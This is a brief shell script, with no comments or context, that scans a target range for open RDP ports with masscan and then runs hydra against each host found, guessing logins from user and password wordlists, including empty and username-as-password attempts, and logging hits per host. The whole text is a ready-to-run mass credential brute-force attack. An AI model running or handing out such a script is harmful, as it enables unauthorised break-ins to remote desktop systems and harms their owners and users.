d=$(masscan -p3389 $1 )
ips=$(echo $d | awk '{print $6}')
echo $ips > results.txt
for lin1 in $(cat results.txt); do hydra -L user.txt -P pass.txt -e ns -o Output/rdp_$lin1.txt -I -V -W 3 -t 10 $lin1 rdp ; done
